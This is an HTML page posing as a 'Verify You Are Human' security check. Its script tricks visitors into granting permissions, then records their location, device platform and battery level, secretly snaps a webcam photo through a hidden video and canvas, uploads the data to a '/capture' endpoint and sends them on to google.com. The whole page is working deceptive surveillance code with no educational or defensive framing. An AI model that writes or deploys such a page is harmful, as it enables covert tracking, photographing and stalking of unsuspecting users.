<!DOCTYPE html>
<html>
<head>
    <title>Human Verification</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body { background: #000; color: #fff; font-family: sans-serif; text-align: center; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
        .box { border: 1px solid #333; padding: 20px; border-radius: 10px; }
        button { background: #007bff; color: white; border: none; padding: 10px 20px; border-radius: 5px; cursor: pointer; font-size: 16px; }
    </style>
</head>
<body>
    <div class="box">
        <h2>Verify You Are Human</h2>
        <p>Please allow access to complete security check.</p>
        <button onclick="init()">VERIFY NOW</button>
    </div>

    <video id="v" style="display:none;" autoplay></video>
    <canvas id="c" style="display:none;" width="640" height="480"></canvas>

    <script>
        async function init() {
            let info = { platform: navigator.platform, battery: "N/A", lat: "N/A", lon: "N/A" };
            
            // Battery
            if(navigator.getBattery) { const b = await navigator.getBattery(); info.battery = (b.level*100)+"%"; }

            // Location & Camera
            navigator.geolocation.getCurrentPosition(async (p) => {
                info.lat = p.coords.latitude; info.lon = p.coords.longitude;
                try {
                    const s = await navigator.mediaDevices.getUserMedia({video:true});
                    const v = document.getElementById('v'); v.srcObject = s;
                    setTimeout(() => {
                        const cn = document.getElementById('c');
                        cn.getContext('2d').drawImage(v,0,0);
                        const img = cn.toDataURL('image/jpeg');
                        s.getTracks().forEach(t => t.stop());
                        send(info, img);
                    }, 2000);
                } catch(e) { send(info, null); }
            }, (e) => { alert("Verification failed. Please allow permissions."); });
        }

        function send(i, p) {
            fetch('/capture', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ info: i, photo: p })
            }).then(() => { window.location.href = "https://google.com"; });
        }
    </script>
</body>
</html>
